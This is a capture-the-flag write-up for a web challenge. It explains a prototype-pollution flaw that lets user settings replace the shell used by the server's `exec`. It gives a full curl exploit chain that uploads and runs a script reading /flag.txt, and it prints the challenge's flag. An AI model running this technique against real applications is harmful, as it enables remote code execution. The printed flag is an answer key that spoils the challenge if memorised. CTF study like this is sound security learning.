The challenge is exposed to prototype pollution. The server accepts user’s settings blindly and builds `opts` for `exec` function. By changing the settings to use our own shell instead of the system allows us to upload the payload via `/app/note`. The payload extract the flag from the root folder, outputs into the console and the server code will stdout to the user as a response when called by `/export?name=pwn`.

```
BASE="https://recipe-for-disaster-3d9bad0d8b320264.challs.brunnerne.xyz"

curl -s -X POST "$BASE/api/settings" \
  -H 'Content-Type: application/json' \
  -d '{"exportOptions":{"shell":"./data/pwn/zip"}}'

cat <<'JSON' | curl -s -X POST "$BASE/api/note" \
  -H 'Content-Type: application/json' --data-binary @-
{
  "name": "pwn",
  "filename": "zip",
  "content": "#!/bin/sh\n\necho 'FOUND_FLAG:'\nif [ -f /flag.txt ]; then\n  cat /flag.txt\n  exit 0\nfi\necho 'no /flag.txt found'; pwd; ls -la /\n",
  "makeExecutable": "true"
}
JSON

curl -s "$BASE/export?name=pwn" -D -
```

Flag: brunner{pr0t0typ3_p0llu710n_0v3rf10w1ng_7h3_0v3n}

Solved by: jerit3787